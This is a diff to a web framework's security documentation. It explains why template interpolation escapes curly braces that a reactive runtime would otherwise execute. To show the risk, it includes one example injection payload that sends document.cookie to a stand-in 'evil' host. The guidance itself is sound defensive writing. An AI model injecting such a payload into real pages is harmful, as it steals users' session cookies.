@@ -17,14 +17,20 @@ belong at the proxy or gateway.
 
 ## HTML and Script Safety
 
-`@{...}` interpolation escapes values in HTML text and attributes. `Html`
-values bypass escaping because they are already trusted.
+`@{...}` interpolation escapes values in HTML text and attributes, braces
+included: `{` and `}` become `&#123;` and `&#125;`. Braces are not
+HTML-special, but the PulsePoint runtime compiles every `{…}` in a reactive
+block, so an unescaped stored value like `{fetch('//evil/' + document.cookie)}`
+would execute. Attribute spreads (`@{..attrs}`) follow the same rule. `Html`
+values bypass escaping because they are already trusted, and keep their braces
+live.
 
 - Prefer normal string/value interpolation.
 - Use `Html::escape` when manually converting untrusted text to `Html`.
 - Use `Html::from_raw` only for framework-authored or independently sanitized
   HTML. It is the explicit trust boundary.
-- Never concatenate untrusted values into an `Html::from_raw` string.
+- Never concatenate untrusted values into an `Html::from_raw` string: its
+  braces are live PulsePoint expressions.
 
 Inside `<script>`, use primitive `RenderJs` values or `Json(&value)`. Rahti
 JSON-quotes strings and neutralizes `<` so user data cannot inject
